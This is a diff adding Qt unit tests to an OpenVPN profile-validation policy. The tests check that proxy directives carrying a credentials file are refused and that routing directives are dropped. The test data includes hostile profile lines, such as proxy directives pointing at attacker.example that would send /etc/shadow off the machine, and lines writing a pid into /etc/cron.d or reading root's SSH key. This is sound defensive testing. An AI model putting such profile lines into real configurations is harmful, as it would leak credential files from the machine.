@@ -123,6 +123,24 @@ private slots:
     //! line; a profile naming one would make root read that instead.
     void auth_user_pass_is_bare_only();
 
+    //! OpenVPN's proxy directives take an authentication FILE positionally and
+    //! then send its content to the proxy the profile itself named: the root
+    //! read and the way off the machine in the same line.
+    void proxy_directives_reject_a_credentials_file_data();
+    void proxy_directives_reject_a_credentials_file();
+
+    //! --route-nopull governs what the SERVER pushes; a route written in the
+    //! profile is applied regardless, so the profile could hand the root
+    //! process this machine's routing table. They are dropped from the
+    //! generated configuration rather than refusing the whole profile, which
+    //! would reject very nearly every provider .ovpn over a directive that
+    //! ends up doing nothing.
+    void routing_directives_are_dropped_data();
+    void routing_directives_are_dropped();
+
+    //! ...and dropping them must not become a way to smuggle one through.
+    void a_dropped_directive_never_reaches_the_generated_config();
+
     //! A connection block holds directives, so it is validated, not skipped.
     void connection_block_is_validated();
 
@@ -203,6 +221,8 @@ void TestOpenVpnConfigPolicy::dangerous_directives_are_refused_data()
     QTest::newRow("writepid")          << QStringLiteral("writepid /etc/cron.d/pwn");
     QTest::newRow("tmp-dir")           << QStringLiteral("tmp-dir /etc");
     QTest::newRow("askpass")           << QStringLiteral("askpass /root/.ssh/id_rsa");
+    QTest::newRow("http-proxy-user-pass")
+            << QStringLiteral("http-proxy-user-pass proxy.auth");
     QTest::newRow("iproute")           << QStringLiteral("iproute /tmp/fake-ip");
     QTest::newRow("dev-node")          << QStringLiteral("dev-node /dev/mem");
     QTest::newRow("daemon")            << QStringLiteral("daemon");
@@ -307,6 +327,89 @@ void TestOpenVpnConfigPolicy::auth_user_pass_is_bare_only()
     QCOMPARE(withPath.directive, QStringLiteral("auth-user-pass"));
 }
 
+void TestOpenVpnConfigPolicy::proxy_directives_reject_a_credentials_file_data()
+{
+    QTest::addColumn<QString>("line");
+    QTest::addColumn<bool>("accepted");
+
+    QTest::newRow("http host+port")   << QStringLiteral("http-proxy proxy.example 8080")   << true;
+    QTest::newRow("http auto")        << QStringLiteral("http-proxy proxy.example 8080 auto")
+                                      << true;
+    QTest::newRow("http auto-nct")    << QStringLiteral("http-proxy proxy.example 8080 auto-nct")
+                                      << true;
+    QTest::newRow("http auto basic")  << QStringLiteral("http-proxy proxy.example 8080 auto basic")
+                                      << true;
+    QTest::newRow("socks host+port")  << QStringLiteral("socks-proxy proxy.example 1080")  << true;
+
+    QTest::newRow("http authfile")
+            << QStringLiteral("http-proxy attacker.example 8080 /etc/shadow basic") << false;
+    QTest::newRow("http sibling authfile")
+            << QStringLiteral("http-proxy attacker.example 8080 proxy.auth basic")   << false;
+    QTest::newRow("http stdin")
+            << QStringLiteral("http-proxy attacker.example 8080 stdin basic")        << false;
+    QTest::newRow("http bad method")
+            << QStringLiteral("http-proxy proxy.example 8080 auto /etc/shadow")      << false;
+    QTest::newRow("http too many")
+            << QStringLiteral("http-proxy p 8080 auto basic extra")                  << false;
+    QTest::newRow("http no port")     << QStringLiteral("http-proxy proxy.example")  << false;
+    QTest::newRow("socks authfile")
+            << QStringLiteral("socks-proxy attacker.example 1080 /etc/shadow")       << false;
+}
+
+void TestOpenVpnConfigPolicy::proxy_directives_reject_a_credentials_file()
+{
+    QFETCH(QString, line);
+    QFETCH(bool, accepted);
+
+    Verdict const v = OpenVpnConfigPolicy::inspect(
+            profile({ QStringLiteral("client"), QStringLiteral("dev tun"), line }));
+
+    QCOMPARE(v.isAccepted(), accepted);
+    if (!accepted)
+        QCOMPARE(v.outcome, Outcome::UnsafeArgument);
+}
+
+void TestOpenVpnConfigPolicy::routing_directives_are_dropped_data()
+{
+    QTest::addColumn<QString>("line");
+
+    QTest::newRow("route")             << QStringLiteral("route 10.0.0.0 255.0.0.0");
+    QTest::newRow("route default")     << QStringLiteral("route 0.0.0.0 0.0.0.0 10.8.0.1");
+    QTest::newRow("redirect-gateway")  << QStringLiteral("redirect-gateway def1");
+    QTest::newRow("redirect-private")  << QStringLiteral("redirect-private");
+    QTest::newRow("route-delay")       << QStringLiteral("route-delay 5");
+    QTest::newRow("route-metric")      << QStringLiteral("route-metric 100");
+}
+
+void TestOpenVpnConfigPolicy::routing_directives_are_dropped()
+{
+    QFETCH(QString, line);
+
+    Verdict const v = OpenVpnConfigPolicy::inspect(
+            profile({ QStringLiteral("client"), QStringLiteral("dev tun"), line }));
+
+    // The profile imports...
+    QVERIFY2(v.isAccepted(), qPrintable(QStringLiteral("%1: %2").arg(line, v.reason)));
+    // ...and the directive is not in what OpenVPN will be handed.
+    QVERIFY2(!v.sanitizedConfig.contains(line.section(QLatin1Char(' '), 0, 0).toUtf8()),
+             qPrintable(QString::fromUtf8(v.sanitizedConfig)));
+}
+
+void TestOpenVpnConfigPolicy::a_dropped_directive_never_reaches_the_generated_config()
+{
+    Verdict const v = OpenVpnConfigPolicy::inspect(profile({
+        QStringLiteral("client"),
+        QStringLiteral("dev tun"),
+        QStringLiteral("redirect-gateway def1 bypass-dhcp"),
+        QStringLiteral("route 0.0.0.0 0.0.0.0 vpn_gateway"),
+        QStringLiteral("remote vpn.example.com 1194"),
+    }));
+
+    QVERIFY(v.isAccepted());
+    QCOMPARE(v.sanitizedConfig,
+             QByteArray("client\ndev tun\nremote vpn.example.com 1194\n"));
+}
+
 void TestOpenVpnConfigPolicy::connection_block_is_validated()
 {
     Verdict const good = OpenVpnConfigPolicy::inspect(profile({
@@ -382,6 +485,8 @@ void TestOpenVpnConfigPolicy::helper_script_lists_match_data()
                                   << OpenVpnConfigPolicy::fileBearingDirectives();
     QTest::newRow("inline blocks") << QStringLiteral("OPENVPN_INLINE_BLOB_TAGS")
                                    << OpenVpnConfigPolicy::inlineBlockTags();
+    QTest::newRow("dropped") << QStringLiteral("OPENVPN_DROPPED_DIRECTIVES")
+                             << OpenVpnConfigPolicy::droppedDirectives();
     QTest::newRow("denied") << QStringLiteral("OPENVPN_DENIED_DIRECTIVES")
                             << OpenVpnConfigPolicy::deniedDirectives();
 }
